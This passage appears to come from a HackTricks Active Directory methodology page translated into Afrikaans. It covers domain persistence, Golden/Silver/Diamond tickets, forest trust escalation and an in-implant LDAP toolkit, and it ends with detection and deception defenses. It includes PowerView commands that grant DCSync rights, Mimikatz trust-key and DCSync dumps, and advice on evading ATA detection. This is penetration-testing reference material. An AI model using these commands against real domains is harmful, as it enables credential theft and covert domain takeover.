Die ontdekking van 'n **Spool service wat luister** binne die domain kan **abused** word om **nuwe credentials te verkry** en **privileges te escalate**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

As **ander gebruikers** toegang verkry tot die **gekompromitteerde** machine, is dit moontlik om **credentials uit memory te gather** en selfs **beacons in hulle processes in te inject** om hulle te impersonate.\
Gewoonlik sal gebruikers die system via RDP access, so hier het jy hoe om 'n paar attacks oor third party RDP sessions uit te voer:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** bied 'n system vir die bestuur van die **local Administrator password** op domain-joined computers, en verseker dat dit **randomized**, uniek, en gereeld **changed** word. Hierdie passwords word in Active Directory gestoor en toegang word deur ACLs beheer, slegs vir gemagtigde users. Met voldoende permissions om toegang tot hierdie passwords te kry, word pivoting na ander computers moontlik.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Om certificates van die gekompromitteerde machine te gather** kan 'n manier wees om privileges binne die environment te escalate:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

As **vulnerable templates** gekonfigureer is, is dit moontlik om hulle te abuse om privileges te escalate:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Sodra jy **Domain Admin** of selfs beter **Enterprise Admin** privileges kry, kan jy die **domain database** dump: _ntds.dit_.

[**Meer inligting oor die DCSync attack kan hier gevind word**](dcsync.md).

[**Meer inligting oor hoe om die NTDS.dit te steal kan hier gevind word**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Sommige van die tegnieke wat voorheen bespreek is, kan vir persistence gebruik word.\
Byvoorbeeld, jy kan:

- Maak users kwesbaar vir [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Maak users kwesbaar vir [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Verleen [**DCSync**](#dcsync) privileges aan 'n gebruiker

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Die **Silver Ticket attack** skep 'n **legitimate Ticket Granting Service (TGS) ticket** vir 'n spesifieke service deur die **NTLM hash** te gebruik (byvoorbeeld, die **hash van die PC account**). Hierdie metode word gebruik om **toegang tot die service privileges** te kry.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

'n **Golden Ticket attack** behels dat 'n aanvaller toegang kry tot die **NTLM hash van die krbtgt account** in 'n Active Directory (AD) environment. Hierdie account is spesiaal omdat dit gebruik word om alle **Ticket Granting Tickets (TGTs)** te teken, wat noodsaaklik is vir authenticating binne die AD network.

Sodra die aanvaller hierdie hash verkry, kan hy **TGTs** vir enige account skep wat hy kies (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Hierdie is soos golden tickets wat op 'n manier vervals is wat **common golden tickets detection mechanisms omseil.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Om certificates van 'n account te hê of in staat te wees om daarvoor aansoek te doen** is 'n baie goeie manier om in die users account te kan persist (selfs al verander hy die password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Om certificates te gebruik is ook moontlik om met hoë privileges binne die domain te persist:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Die **AdminSDHolder** object in Active Directory verseker die security van **privileged groups** (soos Domain Admins en Enterprise Admins) deur 'n standaard **Access Control List (ACL)** oor hierdie groups toe te pas om unauthorized changes te voorkom. Hierdie feature kan egter abused word; as 'n attacker die AdminSDHolder se ACL wysig om volle access aan 'n gewone gebruiker te gee, kry daardie gebruiker uitgebreide control oor al die privileged groups. Hierdie security measure, bedoel om te protect, kan dus teen hulle draai en ongewenste access toelaat tensy dit noukeurig gemonitor word.

[**Meer inligting oor AdminDSHolder Group hier.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Binne elke **Domain Controller (DC)** bestaan 'n **local administrator** account. Deur admin rights op so 'n machine te verkry, kan die local Administrator hash met **mimikatz** onttrek word. Daarna is 'n registry modification nodig om die **gebruik van hierdie password toe te laat**, wat remote access tot die local Administrator account moontlik maak.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Jy kan sommige **spesiale permissions** aan 'n **user** oor sekere spesifieke domain objects gee wat die user later in staat sal stel om privileges te **escalate**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Die **security descriptors** word gebruik om die **permissions** wat 'n **object** oor 'n **object** het, te **store**. As jy net 'n **klein verandering** in die **security descriptor** van 'n object kan maak, kan jy baie interessante privileges oor daardie object verkry sonder om lid van 'n privileged group te hoef te wees.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse die `dynamicObject` auxiliary class om kortstondige principals/GPOs/DNS records met `entryTTL`/`msDS-Entry-Time-To-Die` te skep; hulle self-delete sonder tombstones, wat LDAP evidence uitvee terwyl verweesde SIDs, gebreekte `gPLink` refs, of cached DNS responses agterbly (bv. AdminSDHolder ACE pollution of kwaadwillige `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Verander **LSASS** in memory om 'n **universal password** te vestig, wat toegang tot alle domain accounts verleen.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Lear­n wat 'n SSP (Security Support Provider) is hier.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Jy kan jou **eie SSP** skep om die **credentials** wat gebruik word om toegang tot die machine te kry, in **clear text** te **capture**.


{{#ref}}
custom-ssp.md
{{endref}}

### DCShadow

Dit registreer 'n **nuwe Domain Controller** in die AD en gebruik dit om attributes (SIDHistory, SPNs...) op gespesifiseerde objects te **push** **sonder** om enige **logs** oor die **modifications** te laat. Jy **het DA** privileges nodig en moet binne die **root domain** wees.\
Let daarop dat as jy verkeerde data gebruik, baie lelike logs sal verskyn.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Voorheen het ons bespreek hoe om privileges te escalate as jy **genoeg permission het om LAPS passwords te lees**. Hierdie passwords kan egter ook gebruik word om **persistence te handhaaf**.\
Kyk:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft beskou die **Forest** as die security boundary. Dit impliseer dat **die kompromittering van 'n enkele domain moontlik tot die kompromittering van die hele Forest kan lei**.

### Basic Information

'n [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is 'n security mechanism wat 'n gebruiker van een **domain** in staat stel om resources in 'n ander **domain** te access. Dit skep in wese 'n koppeling tussen die authentication systems van die twee domains, wat authentication verifications toelaat om naatloos te vloei. Wanneer domains 'n trust opstel, ruil en behou hulle spesifieke **keys** binne hul **Domain Controllers (DCs)**, wat noodsaaklik is vir die trust se integrity.

In 'n tipiese scenario, as 'n gebruiker toegang tot 'n service in 'n **trusted domain** wil kry, moet hy eers 'n spesiale ticket aanvra wat bekend staan as 'n **inter-realm TGT** vanaf sy eie domain se DC. Hierdie TGT word met 'n gedeelde **key** geïnkripteer waarop albei domains ooreengekom het. Die gebruiker bied dan hierdie TGT aan die **DC van die trusted domain** om 'n service ticket (**TGS**) te kry. Na suksesvolle validasie van die inter-realm TGT deur die trusted domain se DC, reik dit 'n TGS uit, wat die gebruiker toegang tot die service gee.

**Steps**:

1. 'n **client computer** in **Domain 1** begin die proses deur sy **NTLM hash** te gebruik om 'n **Ticket Granting Ticket (TGT)** vanaf sy **Domain Controller (DC1)** aan te vra.
2. DC1 reik 'n nuwe TGT uit indien die client suksesvol authenticated is.
3. Die client vra dan 'n **inter-realm TGT** vanaf DC1 aan, wat nodig is om toegang tot resources in **Domain 2** te kry.
4. Die inter-realm TGT word met 'n **trust key** geïnkripteer wat tussen DC1 en DC2 gedeel word as deel van die twee-rigting domain trust.
5. Die client neem die inter-realm TGT na **Domain 2 se Domain Controller (DC2)**.
6. DC2 verifieer die inter-realm TGT met sy gedeelde trust key en, indien geldig, reik 'n **Ticket Granting Service (TGS)** uit vir die server in Domain 2 waartoe die client toegang wil hê.
7. Laastens bied die client hierdie TGS aan die server, wat met die server se account hash geïnkripteer is, om toegang tot die service in Domain 2 te kry.

### Different trusts

Dit is belangrik om raak te sien dat **'n trust een rigting of twee rigtings kan wees**. In die twee rigtings opsie, sal albei domains mekaar trust, maar in die **1-rigting** trust relation sal een van die domains die **trusted** en die ander die **trusting** domain wees. In die laaste geval, **sal jy slegs in staat wees om resources binne die trusting domain vanaf die trusted een te access**.

As Domain A Domain B trust, is A die trusting domain en B die trusted een. Verder, in **Domain A**, sal dit 'n **Outbound trust** wees; en in **Domain B**, sal dit 'n **Inbound trust** wees.

**Different trusting relationships**

- **Parent-Child Trusts**: Dit is 'n algemene opstelling binne dieselfde forest, waar 'n child domain outomaties 'n twee-rigting transitive trust met sy parent domain het. Dit beteken in wese dat authentication requests naatloos tussen die parent en die child kan vloei.
- **Cross-link Trusts**: Verwys na as "shortcut trusts," hierdie word tussen child domains ingestel om referral processes te bespoedig. In komplekse forests moet authentication referrals tipies tot by die forest root gaan en dan af na die target domain. Deur cross-links te skep, word die reis verkort, wat veral voordelig is in geografies verspreide omgewings.
- **External Trusts**: Hierdie word tussen verskillende, onverwante domains opgestel en is van nature non-transitive. Volgens [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), is external trusts nuttig vir toegang tot resources in 'n domain buite die huidige forest wat nie deur 'n forest trust gekoppel is nie. Security word versterk deur SID filtering met external trusts.
- **Tree-root Trusts**: Hierdie trusts word outomaties tussen die forest root domain en 'n nuut bygevoegde tree root ingestel. Alhoewel hulle nie dikwels aangetref word nie, is tree-root trusts belangrik vir die byvoeging van nuwe domain trees by 'n forest, wat hulle in staat stel om 'n unieke domain name te behou en twee-rigting transitivity te verseker. Meer inligting kan in [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) gevind word.
- **Forest Trusts**: Hierdie tipe trust is 'n twee-rigting transitive trust tussen twee forest root domains, wat ook SID filtering afdwing om security measures te verbeter.
- **MIT Trusts**: Hierdie trusts word ingestel met nie-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. MIT trusts is effens meer gespesialiseerd en pas by omgewings wat integrasie met Kerberos-gebaseerde systems buite die Windows ecosystem benodig.

#### Other differences in **trusting relationships**

- 'n Trust relationship kan ook **transitive** wees (A trust B, B trust C, dan trust A C) of **non-transitive**.
- 'n Trust relationship kan opgestel word as **bidirectional trust** (albei trust mekaar) of as **one-way trust** (slegs een van hulle trust die ander).

### Attack Path

1. **Enumerate** die trusting relationships
2. Check of enige **security principal** (user/group/computer) **access** tot resources van die **ander domain** het, miskien deur ACE entries of deur in groups van die ander domain te wees. Soek vir **relationships across domains** (die trust is waarskynlik hiervoor geskep).
1. kerberoast in hierdie geval kan 'n ander opsie wees.
3. **Compromise** die **accounts** wat oor domains kan **pivot**.

Attackers met toegang tot resources in 'n ander domain kan dit deur drie primêre mechanisms doen:

- **Local Group Membership**: Principals kan by local groups op machines gevoeg word, soos die “Administrators” group op 'n server, wat hulle aansienlike control oor daardie machine gee.
- **Foreign Domain Group Membership**: Principals kan ook lede van groups binne die foreign domain wees. Die doeltreffendheid van hierdie metode hang egter af van die aard van die trust en die scope van die group.
- **Access Control Lists (ACLs)**: Principals kan in 'n **ACL** gespesifiseer word, veral as entiteite in **ACEs** binne 'n **DACL**, wat hulle toegang tot spesifieke resources gee. Vir diegene wat die meganika van ACLs, DACLs, en ACEs verder wil verken, is die whitepaper getiteld “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 'n onskatbare resource.

### Find external users/groups with permissions

Jy kan **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** check om foreign security principals in die domain te vind. Hierdie sal user/group van **'n external domain/forest** wees.

Jy kan dit in **Bloodhound** check of met powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Ander maniere om domain trusts te enumereer:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Daar is **2 trusted keys**, een vir _Child --> Parent_ en nog een vir _Parent_ --> _Child_.\
> Jy kan die een wat deur die huidige domain gebruik word vind met:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate as Enterprise admin na die child/parent domain deur die trust met SID-History injection te abuse:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Om te verstaan hoe die Configuration Naming Context (NC) ge-exploit kan word, is cruciaal. Die Configuration NC dien as ’n sentrale bewaarplek vir configuration data oor ’n forest in Active Directory (AD) environments. Hierdie data word na elke Domain Controller (DC) binne die forest gereplikeer, met writable DCs wat ’n writable copy van die Configuration NC onderhou. Om dit te exploit, moet ’n mens **SYSTEM privileges op ’n DC** hê, verkieslik ’n child DC.

**Link GPO to root DC site**

Die Configuration NC se Sites container bevat inligting oor al die domain-joined computers se sites binne die AD forest. Deur met SYSTEM privileges op enige DC te werk, kan attackers GPOs aan die root DC sites link. Hierdie aksie kan moontlik die root domain compromise deur policies te manipuleer wat op hierdie sites toegepas word.

Vir in-diepte inligting, kan ’n mens research oor [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) verken.

**Compromise any gMSA in the forest**

’n Attack vector behels die teiken van privileged gMSAs binne die domain. Die KDS Root key, noodsaaklik vir die berekening van gMSAs se passwords, word binne die Configuration NC gestoor. Met SYSTEM privileges op enige DC, is dit moontlik om toegang tot die KDS Root key te kry en die passwords vir enige gMSA oor die hele forest te bereken.

Gedetailleerde analise en stap-vir-stap guidance kan gevind word in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Aanvullende delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Addisionele external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Hierdie method vereis geduld, en wag vir die skepping van nuwe privileged AD objects. Met SYSTEM privileges kan ’n attacker die AD Schema modify om enige user volledige control oor alle classes te gee. Dit kan lei tot unauthorized access en control oor nuutgeskepte AD objects.

Verdere leeswerk is beskikbaar by [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Die ADCS ESC5 vulnerability teiken control oor Public Key Infrastructure (PKI) objects om ’n certificate template te skep wat authentication as enige user binne die forest moontlik maak. Aangesien PKI objects in die Configuration NC woon, enable die compromise van ’n writable child DC die uitvoering van ESC5 attacks.

Meer details hieroor kan gelees word in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenario's sonder ADCS, het die attacker die capability om die nodige components op te stel, soos bespreek in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In hierdie scenario **jou domain word vertrou** deur ’n eksterne een, wat jou **ongedefinieerde permissions** daaroor gee. Jy sal moet uitvind **watter principals van jou domain watter access oor die eksterne domain het** en dit dan probeer exploit:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In hierdie scenario **jou domain** vertrou **privileges** aan ’n principal van **different domains** toe.

Wanneer ’n **domain trusted is** deur die trusting domain, skep die trusted domain egter **’n user** met ’n **voorspelbare naam** wat as **password die trusted password** gebruik. Dit beteken dat dit moontlik is om **’n user van die trusting domain** te gebruik om **in die trusted one in te kom** en dit te enumereer en te probeer om meer privileges te eskaleer:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Nog ’n manier om die trusted domain te kompromitteer is om ’n [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) te vind wat in die **teenoorgestelde rigting** van die domain trust geskep is (wat nie baie algemeen is nie).

Nog ’n manier om die trusted domain te kompromitteer is om te wag in ’n machine waar ’n **user from the trusted domain can access** om via **RDP** aan te meld. Dan kan die attacker code in die RDP session process injecteer en **access the origin domain of the victim** van daar af.\
Verder, as die **victim his hard drive gemount** het, kan die attacker vanaf die **RDP session** process **backdoors** in die **startup folder of the hard drive** stoor. Hierdie tegniek word **RDPInception** genoem.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Die risiko van attacks wat die SID history attribute oor forest trusts benut, word verminder deur SID Filtering, wat by verstek op alle inter-forest trusts geaktiveer is. Dit rus op die aanname dat intra-forest trusts veilig is, met die forest, eerder as die domain, as die security boundary volgens Microsoft se standpunt.
- Daar is egter ’n vangplek: SID filtering kan applications en user access ontwrig, wat lei tot die af en toe deaktivering daarvan.

### **Selective Authentication:**

- Vir inter-forest trusts verseker Selective Authentication dat users van die twee forests nie outomaties geauthentiseer word nie. In plaas daarvan is eksplisiete permissions nodig vir users om domains en servers binne die trusting domain of forest te access.
- Dit is belangrik om daarop te let dat hierdie maatreëls nie beskerm teen die uitbuiting van die writable Configuration Naming Context (NC) of attacks op die trust account nie.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) herimplementeer bloodyAD-styl LDAP primitives as x64 Beacon Object Files wat heeltemal binne ’n on-host implant (bv. Adaptix C2) loop. Operators kompileer die pack met `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laai `ldap.axs`, en roep dan `ldap <subcommand>` vanaf die beacon. Alle traffic gebruik die huidige logon security context oor LDAP (389) met signing/sealing of LDAPS (636) met auto certificate trust, so geen socks proxies of disk artifacts is nodig nie.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, en `get-groupmembers` los kort names/OU paths op na volle DNs en dump die ooreenstemmende objects.
- `get-object`, `get-attribute`, en `get-domaininfo` haal arbitrêre attributes (insluitend security descriptors) plus die forest/domain metadata van `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, en `get-rbcd` maak roasting candidates, delegation settings, en bestaande [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors direk vanaf LDAP sigbaar.
- `get-acl` en `get-writable --detailed` parse die DACL om trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), en inheritance te lys, wat onmiddellike targets vir ACL privilege escalation gee.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalatie & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) laat die operator toe om nuwe principals of machine accounts te stage waar ook al OU rights bestaan. `add-groupmember`, `set-password`, `add-attribute`, en `set-attribute` hijack teikens direk sodra write-property rights gevind word.
- ACL-gefokusde commands soos `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, en `add-dcsync` vertaal WriteDACL/WriteOwner op enige AD object in password resets, group membership control, of DCSync replication privileges sonder om PowerShell/ADSI artifacts agter te laat. `remove-*` teenhangers maak injected ACEs skoon.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` maak onmiddellik ’n compromised user Kerberoastable; `add-asreproastable` (UAC toggle) merk dit vir AS-REP roasting sonder om die password aan te raak.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) herskryf `msDS-AllowedToDelegateTo`, UAC flags, of `msDS-AllowedToActOnBehalfOfOtherIdentity` vanaf die beacon, wat constrained/unconstrained/RBCD attack paths moontlik maak en die behoefte aan remote PowerShell of RSAT uitskakel.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` injecteer privileged SIDs in ’n beheerde principal se SID history (sien [SID-History Injection](sid-history-injection.md)), wat stealthy access inheritance volledig oor LDAP/LDAPS bied.
- `move-object` verander die DN/OU van computers of users, wat ’n attacker toelaat om assets in OUs in te sleep waar delegated rights reeds bestaan voordat `set-password`, `add-groupmember`, of `add-spn` misbruik word.
- Strak-geskepte removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ens.) laat vinnige rollback toe nadat die operator credentials of persistence geharvest het, wat telemetry minimaliseer.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Dit word aanbeveel dat Domain Admins slegs toegelaat word om op Domain Controllers in te log, en hul gebruik op ander hosts te vermy.
- **Service Account Privileges**: Services moet nie met Domain Admin (DA) privileges uitgevoer word nie om security te handhaaf.
- **Temporal Privilege Limitation**: Vir take wat DA privileges vereis, moet hul duur beperk word. Dit kan bereik word deur: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audit Event IDs 2889/3074/3075 en dwing dan LDAP signing plus LDAPS channel binding op DCs/clients af om LDAP MITM/relay pogings te blokkeer.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

As jy algemene AD tradecraft wil detect, **moenie net staatmaak op operator-controlled artifacts** soos hernoemde binaries, service names, temp batch files, of output paths nie. Baseline hoe wettige Windows clients [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, en WMI traffic bou, en kyk dan vir **implementation quirks** wat oorbly selfs nadat die operator `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, of `ntlmrelayx.py` wysig.

- **High-confidence standalone candidates** (after validating against your own baseline):
- Authenticated DCE/RPC using `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding filled with `0xff`
- LDAP Kerberos binds that place a raw Kerberos `AP-REQ` directly in SPNEGO `mechToken`
- SMB2/3 negotiate requests with ASCII-looking `ClientGuid` values
- WMI `IWbemLevel1Login::NTLMLogin` using the non-standard namespace `//./root/cimv2`
- Hardcoded Kerberos nonce values
- **Better as correlation/scoring features**:
- Sparse or duplicated Kerberos etype lists, unusual/missing `PA-DATA`, or TGS-REQ etype ordering that differs from native Windows
- NTLM Type 1 messages missing version info or Type 3 messages with null host names
- Raw NTLMSSP carried in DCE/RPC instead of SPNEGO, missing DCE/RPC verification trailers, or SPNEGO/Kerberos OID mismatches
- Several of these traits from the same host/user/session/time window are far stronger than any single weak field
- **Use as enrichment, not as standalone alerts**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names, and tool-specific HTTP/WebDAV/RDP/MSSQL strings
- These are easy for operators to change and are best used to explain why a cross-protocol cluster is suspicious
- **Operational notes**:
- Some of these signals require decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, or service-side visibility
- Validate against Samba/Linux clients, appliances, and legacy software before promoting to alerts
- Promote detections from enrichment -> hunting -> alerting as you build confidence in the baseline

### **Implementing Deception Techniques**

- Implementing deception involves setting traps, like decoy users or computers, with features such as passwords that do not expire or are marked as Trusted for Delegation. A detailed approach includes creating users with specific rights or adding them to high privilege groups.
- A practical example involves using tools like: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- More on deploying deception techniques can be found at [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Suspicious indicators include atypical ObjectSID, infrequent logons, creation dates, and low bad password counts.
- **General Indicators**: Comparing attributes of potential decoy objects with those of genuine ones can reveal inconsistencies. Tools like [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) can assist in identifying such deceptions.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Avoiding session enumeration on Domain Controllers to prevent ATA detection.
- **Ticket Impersonation**: Utilizing **aes** keys for ticket creation helps evade detection by not downgrading to NTLM.
- **DCSync Attacks**: Executing from a non-Domain Controller to avoid ATA detection is advised, as direct execution from a Domain Controller will trigger alerts.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11ee)

{{#include ../../banners/hacktricks-training.md}}
